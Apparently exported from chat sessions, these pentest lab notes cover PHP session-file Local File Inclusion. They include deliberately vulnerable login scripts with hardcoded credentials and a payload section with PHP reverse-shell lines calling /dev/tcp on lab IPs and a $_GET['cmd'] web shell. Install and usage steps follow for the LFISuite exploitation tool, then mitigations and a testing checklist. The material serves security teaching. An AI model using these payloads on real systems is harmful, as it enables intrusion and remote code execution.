  
13:58

# 🔐 PHP Sessions and Local File Inclusion (LFI) Attack

## 📋 Table of Contents

- [PHP Session Storage](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#php-session-storage)
- [Vulnerability: Local File Inclusion (LFI) via Session Files](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#vulnerability-local-file-inclusion-lfi-via-session-files)
- [Example Vulnerable PHP Script](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#example-vulnerable-php-script-lfi-phpsessionphp)
- [Example PHP Payloads](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#example-php-payloads-potentially-stored-in-sessions)
- [Another Session Handling Example](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#another-session-handling-example-lfi-phpsession2php)

---

## 📁 PHP Session Storage

When a website uses PHP sessions (with PHPSESSID), session data is typically stored on the server filesystem in paths such as:

bash

````bash
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php/sess_[PHPSESSID]
```

> **Note:** The files contain serialized session data corresponding to the PHPSESSID cookie.

---

## 🚨 Vulnerability: Local File Inclusion (LFI) via Session Files

If an application exposes a Local File Inclusion (LFI) vulnerability, it may allow an attacker to include and read session files by specifying the session file path, for example:
```
http://192.168.1.45/webpentest/local-file-inclusion.php?file=/var/lib/php/sessions/sess_vhcq3jkuh2odqbl73kpfro9bhh
````

> ⚠️ **Warning:** This can lead to sensitive information disclosure or code execution if session files contain executable PHP code.

---

## 📝 Example Vulnerable PHP Script: `lfi-phpsession.php`

### File Location

bash

```bash
vim lfi-phpsession.php
```

### Code

php

```php
<?php
if (isset($_POST['submit'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    session_start();
    $_SESSION['username'] = $username;
}
?>
<!DOCTYPE html>

<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PHP Session</title>
</head>
<body>
    <form action="lfi-phpsession.php" method="POST">
        Username: <input type="text" name="username" value="" /> <br />
        Password: <input type="password" name="password" value="" /> <br />
        <input type="submit" name="submit" value="login" />
    </form>
</body>
</html>
```

---

## 💉 Example PHP Payloads Potentially Stored in Sessions

These are sample PHP payloads an attacker might try to inject and execute if session files are included:

### 1. Reverse Shell via /bin/bash

php

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.77/443 0>&1'"); ?>
```

### 2. Reverse Shell via system()

php

```php
<?php system('bash -i >& /dev/tcp/192.168.1.6/443 0>&1'); ?>
```

### 3. Command Execution via $_GET

php

```php
<?php echo system($_GET['cmd']); ?>
```

### 4. Direct Reverse Shell

php

```php
<?php /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.6/443 0>&1' ?>
```

---

## 🔄 Another Session Handling Example: `lfi-phpsession2.php`

### File Location

bash

```bash
vim lfi-phpsession2.php
```

### Code

php

```php
<?php
    if (isset($_POST['submit'])) {
        
        $username = $_POST['username'];
        
        $password = $_POST['password'];
        
        if ($username == "admin" && $password == "@rmour123") {
            
            session_start();
            
            $cookie_name = "user";
            
            $cookie_value = "admin";
            
            $cookie_expire = time()+(60*60*24*7);
            
            setcookie($cookie_name, $cookie_value, $cookie_expire);
            
            $_SESSION['user'] = $_COOKIE['user'];
            
        }
        
    }

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PHP Session</title>
</head>
<body>
    
    <form action="lfi-phpsession2.php" method="POST">
        
        Username: <input type="text" name="username" value="" /> <br />
        Password: <input type="password" name="password" value="" /> <br />
        <input type="submit" name="submit" value="login" />
        
    </form>

</body>
</html>
```

### Key Features:

- ✅ Hardcoded credentials: `admin` / `@rmour123`
- 🍪 Sets cookie named "user" with value "admin"
- ⏱️ Cookie expiration: 7 days
- 💾 Stores user data in session: `$_SESSION['user']`

---

## 🎯 Attack Summary

|Step|Description|
|---|---|
|1️⃣|Find LFI vulnerability in target application|
|2️⃣|Inject malicious PHP code via user input (username, etc.)|
|3️⃣|Code gets stored in session file|
|4️⃣|Use LFI to include session file path|
|5️⃣|Malicious PHP code executes → Remote Code Execution|

## 🛡️ Mitigation Recommendations

- ✔️ **Validate and sanitize** all user inputs
- ✔️ **Use whitelisting** for file inclusion paths
- ✔️ **Disable** `allow_url_include` in php.ini
- ✔️ **Store sessions** in database instead of filesystem
- ✔️ **Implement proper** access controls
- ✔️ **Regular security** audits and penetration testing

---

## 📚 References

- [OWASP LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PHP Session Security](https://www.php.net/manual/en/session.security.php)
- [File Inclusion Vulnerabilities](https://portswigger.net/web-security/file-path-traversal)



# 🔐 Web Application Security Testing Documentation

## Overview

This document showcases PHP session management vulnerabilities, theme implementation, and Local File Inclusion (LFI) exploitation techniques discovered during web application penetration testing.

---

## 📋 Table of Contents

1. [Complete PHP Session Code](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#complete-php-session-code)
2. [Code Analysis & Breakdown](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#code-analysis--breakdown)
3. [LFI Attack Vectors](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#lfi-attack-vectors)
4. [Security Considerations](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#security-considerations)

---

## 💻 Complete PHP Session Code

### **File: `lfi-phpsession2.php`**

```php
<?php
// Start session before any output
session_start();

// Default theme fallback
$theme = 'light';

// Handle form submit
if (isset($_POST['submit'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['passwd'] ?? '';
    $selectedTheme = $_POST['theme'] ?? 'light';
    
    // Simple credential check (keep as-is or replace with proper auth)
    if ($username === "admin" && $password === "@rmour123") {
        // Set user cookie (7 days)
        $cookie_expire = time() + (60 * 60 * 24 * 7);
        setcookie('user', $username, $cookie_expire, '/');
        
        // Set theme cookie (7 days)
        setcookie('theme', $selectedTheme, $cookie_expire, '/');
        
        // Also set session values so you can use them immediately
        $_SESSION['user'] = $username;
        $_SESSION['theme'] = $selectedTheme;
        
        // Redirect to same page so cookies are available in $_COOKIE on next request
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid username or password.";
    }
}

// Decide theme to apply now (priority: session -> cookie -> default)
if (isset($_SESSION['theme'])) {
    $theme = $_SESSION['theme'];
} elseif (isset($_COOKIE['theme'])) {
    $theme = $_COOKIE['theme'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>PHP Session & Theme</title>
    <style>
        /* Very simple example theme styling */
        body.light { background: #fff; color: #111; }
        body.dark { background: #121212; color: #eee; }
        .container { 
            max-width: 480px; 
            margin: 2rem auto; 
            padding: 1rem; 
            border-radius: 8px; 
        }
        .card { 
            padding: 1rem; 
            border-radius: 6px; 
            background: rgba(0,0,0,0.05); 
        }
    </style>
</head>
<body class="<?= htmlspecialchars($theme) ?>">
    <div class="container">
        <h1>Login (theme stored in cookie)</h1>
        
        <?php if (!empty($login_error)): ?>
            <div style="color: #c00;"><?= htmlspecialchars($login_error) ?></div>
        <?php endif; ?>
        
        <?php if (!empty($_SESSION['user'])): ?>
            <div class="card">
                <p>Welcome, <strong><?= htmlspecialchars($_SESSION['user']) ?></strong>!</p>
                <p>Current theme: <strong><?= htmlspecialchars($theme) ?></strong></p>
                <form method="post" action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>">
                    <label>
                        Change theme:
                        <select name="theme">
                            <option value="light" <?= $theme === 'light' ? 'selected' : '' ?>>Light</option>
                            <option value="dark" <?= $theme === 'dark' ? 'selected' : '' ?>>Dark</option>
                        </select>
                    </label>
                    <button type="submit" name="submit" value="updateTheme">Update theme</button>
                </form>
            </div>
        <?php else: ?>
            <form action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" method="POST" class="card">
                <label>Username:
                    <input type="text" name="username" value="" required />
                </label><br /><br />
                <label>Password:
                    <input type="password" name="passwd" value="" required />
                </label><br /><br />
                
                <fieldset>
                    <legend>Choose theme</legend>
                    <label><input type="radio" name="theme" value="light" <?= $theme === 'light' ? 'checked' : '' ?> /> Light</label>
                    <label><input type="radio" name="theme" value="dark" <?= $theme === 'dark' ? 'checked' : '' ?> /> Dark</label>
                </fieldset>
                
                <input type="submit" name="submit" value="login" />
            </form>
        <?php endif; ?>
        
    </div>
</body>
</html>
```

---

## 🔍 Code Analysis & Breakdown

### **Section 1: Session Initialization**

```php
<?php
session_start();
```

**Purpose**: Initializes PHP session handling before any HTML output.

**Security Note**: Must be called before any headers or content is sent to the browser.

---

### **Section 2: Authentication Logic**

```php
if (isset($_POST['submit'])) {
    if ($username == "admin" && $password == "@rmour123") {
        session_start();
        
        $cookie_name = "user";
        $cookie_value = "admin";
        $cookie_expire = time() + (60*60*24*7);
        
        setcookie($cookie_name, $cookie_value, $cookie_expire);
        $_SESSION['user'] = $_COOKIE['user'];
    }
}
```

**Breakdown**:

- Checks if form submitted via POST method
- Validates hardcoded credentials (⚠️ **VULNERABILITY**)
- Sets cookie with 7-day expiration
- Stores user session data

**Vulnerabilities**:

- ❌ Hardcoded credentials
- ❌ Plain text password comparison
- ❌ No password hashing
- ❌ No input sanitization
- ❌ Missing CSRF protection

---

### **Section 3: Theme Management**

```php
$username = $_POST['username'] ?? '';
$password = $_POST['passwd'] ?? '';
$selectedTheme = $_POST['theme'] ?? 'light';

// Set theme cookie (7 days)
setcookie('theme', $selectedTheme, $cookie_expire, '/');

// Also set session values
$_SESSION['user'] = $username;
$_SESSION['theme'] = $selectedTheme;
```

**Features**:

- ✅ Null coalescing operator for safe defaults
- ✅ Persistent theme storage via cookies
- ✅ Immediate session availability

---

### **Section 4: HTML Structure & Styling**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>PHP Session & Theme</title>
    <style>
        body.light { background: #fff; color: #111; }
        body.dark { background: #121212; color: #eee; }
        .container { 
            max-width: 480px; 
            margin: 2rem auto; 
            padding: 1rem; 
            border-radius: 8px; 
        }
        .card { 
            padding: 1rem; 
            border-radius: 6px; 
            background: rgba(0,0,0,0.05); 
        }
    </style>
</head>
```

**Design Features**:

- Responsive viewport meta tag
- Dynamic theme classes
- Card-based UI layout
- Minimal styling approach

---

### **Section 5: Dynamic Content Rendering**

```php
<?php if (!empty($_SESSION['user'])): ?>
    <div class="card">
        <p>Welcome, <strong><?= htmlspecialchars($_SESSION['user']) ?></strong>!</p>
        <p>Current theme: <strong><?= htmlspecialchars($theme) ?></strong></p>
        <form method="post" action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>">
            <label>
                Change theme:
                <select name="theme">
                    <option value="light" <?= $theme === 'light' ? 'selected' : '' ?>>Light</option>
                    <option value="dark" <?= $theme === 'dark' ? 'checked' : '' ?>>Dark</option>
                </select>
            </label>
            <button type="submit" name="submit" value="updateTheme">Update theme</button>
        </form>
    </div>
<?php else: ?>
    <form action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" method="POST" class="card">
        <label>Username:
            <input type="text" name="username" value="" required />
        </label><br /><br />
        <label>Password:
            <input type="password" name="passwd" value="" required />
        </label><br /><br />
        
        <input type="submit" name="submit" value="login" />
    </form>
<?php endif; ?>
```

**Conditional Rendering**:

- Shows welcome message for authenticated users
- Displays login form for guests
- Uses `htmlspecialchars()` for XSS prevention

---

## ⚠️ LFI Attack Vectors & Exploitation

<div align="center">

# 🛠️ **LFISuite - Local File Inclusion Testing Framework**

### _Automated LFI Vulnerability Scanner & Exploitation Tool_

</div>

---

### 🎯 **Core Features**

|Feature|Description|
|---|---|
|**Automatic Scanning & Exploitation**|Supports 8 LFI attack vectors including `/proc/self/environ`, `php://filter`, `php://input`, access logs, and more|
|**Auto-Hack Mode**|Runs all attack techniques automatically to maximize exploit coverage|
|**Reverse Shell Capability**|Once an LFI shell is achieved, entering `"reverseshell"` drops a reverse shell back to the attacker's listener (e.g., via `nc -lvp PORT`)|
|**Tor Proxy Support**|Integrates with Tor to mask attack traffic|
|**Update & Dependency Management**|Automatically checks and installs missing dependencies, given sufficient permissions|

---

### 📦 **Installation & Usage**

#### **1. Clone the Repository**

```bash
git clone https://github.com/D35m0nd142/LFISuite.git
```

#### **2. Install Dependencies**

_(Python 2.7 required)_

```bash
pip2.7 install termcolor requests
```

#### **3. Run the Tool**

```bash
python lfisuite.py
```

The interface will guide through configuration, scanning, and exploitation steps.

---

### 🎪 **Attack Modalities Supported**

<div align="center">

```
┌─────────────────────────────────────────────────────────────┐
│                  LFI ATTACK VECTORS                         │
├─────────────────────────────────────────────────────────────┤
│  • /proc/self/environ        → Environment variable exploit │
│  • php://filter              → PHP filter wrapper abuse     │
│  • php://input               → Direct input stream inject   │
│  • /proc/self/fd             → File descriptor manipulation │
│  • Access log poisoning      → Log file injection attacks   │
│  • phpinfo() exploitation    → Info disclosure attacks      │
│  • data:// and expect://     → Alternative PHP wrappers     │
│  • An "Auto-Hack" function   → Automated sequence of all    │
│                                 these vectors automatically  │
└─────────────────────────────────────────────────────────────┘
```

</div>

---

### 💡 **Usage Example**

```bash
$ python lfisuite.py

[*] LFISuite - Local File Inclusion Exploitation Tool
[*] Scanning target: http://vulnerable-site.com/page.php?file=
[+] Testing /proc/self/environ injection...
[+] Testing php://filter wrapper...
[+] Testing php://input method...
[!] VULNERABLE: php://filter method successful!
[*] Attempting to read /etc/passwd...
[+] SUCCESS! File contents retrieved.
```

---

### 🔒 **Ethical Usage Guidelines**

> ⚠️ **WARNING**: This tool is designed for **authorized penetration testing only**
> 
> - ✅ Use only on systems you own or have explicit written permission to test
> - ✅ Conduct testing in isolated environments
> - ✅ Document all findings responsibly
> - ❌ Never use for malicious purposes
> - ❌ Never test production systems without authorization
> - ❌ Never access or exfiltrate sensitive data without permission

---

## 🛡️ Security Considerations

### **Critical Vulnerabilities Identified**

```
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  #  │ VULNERABILITY          │ SEVERITY │ IMPACT          ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  1  │ Hardcoded Credentials  │   🔴 HIGH │ Full Account    ┃
┃     │                        │           │ Compromise      ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  2  │ Plain Text Passwords   │   🔴 HIGH │ Credential      ┃
┃     │                        │           │ Exposure        ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  3  │ Missing Input          │   🟠 MED  │ Injection       ┃
┃     │ Validation             │           │ Attacks         ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  4  │ Session Fixation       │   🟠 MED  │ Session         ┃
┃     │                        │           │ Hijacking       ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  5  │ LFI Susceptibility     │   🔴 HIGH │ File System     ┃
┃     │                        │           │ Access          ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  6  │ No CSRF Protection     │   🟠 MED  │ Unauthorized    ┃
┃     │                        │           │ Actions         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
```

---

### **Recommended Security Mitigations**

#### **1. Password Security**

```php
// ❌ VULNERABLE CODE
if ($username == "admin" && $password == "@rmour123") {
    // authentication logic
}

// ✅ SECURE CODE
$hashed_password = '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi';

if (password_verify($password, $hashed_password)) {
    // authentication logic
}
```

---

#### **2. Input Validation & Sanitization**

```php
// ❌ VULNERABLE CODE
$username = $_POST['username'];
$password = $_POST['password'];

// ✅ SECURE CODE
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = $_POST['password']; // Never sanitize passwords - only hash/verify

// Additional validation
if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
    die("Invalid username format");
}
```

---

#### **3. Session Management**

```php
// ✅ SECURE SESSION HANDLING
session_start();

// Regenerate session ID after login to prevent fixation
if ($authenticated) {
    session_regenerate_id(true);
    $_SESSION['user_id'] = $user_id;
    $_SESSION['logged_in'] = true;
    
    // Set secure session cookie parameters
    session_set_cookie_params([
        'lifetime' => 0,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => true,     // HTTPS only
        'httponly' => true,   // No JavaScript access
        'samesite' => 'Strict' // CSRF protection
    ]);
}
```

---

#### **4. CSRF Protection**

```php
// Generate CSRF token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Include in forms
echo '<input type="hidden" name="csrf_token" value="' . 
     htmlspecialchars($_SESSION['csrf_token']) . '">';

// Verify on submission
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF token validation failed");
}
```

---

#### **5. LFI Prevention**

```php
// ❌ VULNERABLE CODE
$file = $_GET['file'];
include($file);

// ✅ SECURE CODE
$allowed_files = ['home.php', 'about.php', 'contact.php'];
$file = $_GET['file'];

if (in_array($file, $allowed_files)) {
    include($file);
} else {
    http_response_code(404);
    die("File not found");
}
```

---

## 📝 Penetration Testing Checklist

```
┌─ AUTHENTICATION & SESSION MANAGEMENT ───────────────────────┐
│ □ Test for hardcoded credentials                            │
│ □ Verify password hashing implementation                    │
│ □ Check session fixation vulnerabilities                    │
│ □ Test session timeout mechanisms                           │
│ □ Verify secure cookie attributes (HttpOnly, Secure)        │
│ □ Test for session hijacking possibilities                  │
└──────────────────────────────────────────────────────────────┘

┌─ INPUT VALIDATION & INJECTION ──────────────────────────────┐
│ □ Test for SQL injection vulnerabilities                    │
│ □ Check for XSS (Cross-Site Scripting)                      │
│ □ Test for Command injection                                │
│ □ Verify LDAP injection prevention                          │
│ □ Check for XML/XXE injection                               │
│ □ Test file upload restrictions                             │
└──────────────────────────────────────────────────────────────┘

┌─ FILE INCLUSION & PATH TRAVERSAL ───────────────────────────┐
│ □ Test for Local File Inclusion (LFI)                       │
│ □ Check for Remote File Inclusion (RFI)                     │
│ □ Test path traversal vulnerabilities                       │
│ □ Verify file upload security                               │
│ □ Check directory listing exposure                          │
└──────────────────────────────────────────────────────────────┘

┌─ ACCESS CONTROL ────────────────────────────────────────────┐
│ □ Test horizontal privilege escalation                      │
│ □ Test vertical privilege escalation                        │
│ □ Verify role-based access control                          │
│ □ Check for insecure direct object references (IDOR)        │
│ □ Test forced browsing vulnerabilities                      │
└──────────────────────────────────────────────────────────────┘

┌─ CRYPTOGRAPHY & DATA PROTECTION ────────────────────────────┐
│ □ Verify SSL/TLS implementation                             │
│ □ Check for weak encryption algorithms                      │
│ □ Test for sensitive data exposure                          │
│ □ Verify secure password storage                            │
│ □ Check for plaintext transmission of credentials           │
└──────────────────────────────────────────────────────────────┘

┌─ ERROR HANDLING & INFORMATION DISCLOSURE ───────────────────┐
│ □ Test for verbose error messages                           │
│ □ Check for stack trace exposure                            │
│ □ Verify information leakage in responses                   │
│ □ Test for directory indexing                               │
│ □ Check for sensitive file exposure                         │
└──────────────────────────────────────────────────────────────┘
```

---

## 🎯 Conclusion

<div align="center">

### _Understanding Security Through Practical Analysis_

This documentation demonstrates real-world web application vulnerabilities and testing methodologies encountered during penetration testing exercises.

**Key Takeaways**:

- 🔐 Proper authentication implementation is critical
- 🛡️ Input validation prevents injection attacks
- 🔑 Session management requires careful configuration
- ⚠️ LFI vulnerabilities can lead to complete system compromise
- 🧪 Automated tools accelerate vulnerability discovery

</div>

---

<div align="center">

```
╔═══════════════════════════════════════════════════════════╗
║                    ⚠️  DISCLAIMER  ⚠️                     ║
╠═══════════════════════════════════════════════════════════╣
║                                                           ║
║  This information is provided for EDUCATIONAL PURPOSES    ║
║  and AUTHORIZED SECURITY TESTING ONLY.                    ║
║                                                           ║
║  • Always obtain proper written authorization             ║
║  • Never test systems you don't own                       ║
║  • Follow responsible disclosure practices                ║
║  • Comply with all applicable laws and regulations        ║
║                                                           ║
║  Unauthorized access to computer systems is ILLEGAL       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
```

</div>

---

<div align="center">

**Last Updated**: September 23, 2024  
**Environment**: Web Application Penetration Testing Lab  
**Tools Used**: LFISuite, PHP Session Analysis, Manual Code Review  
**Testing Framework**: OWASP Testing Guide v4.2

---

_"Security is not a product, but a process."_ - Bruce Schneier

</div>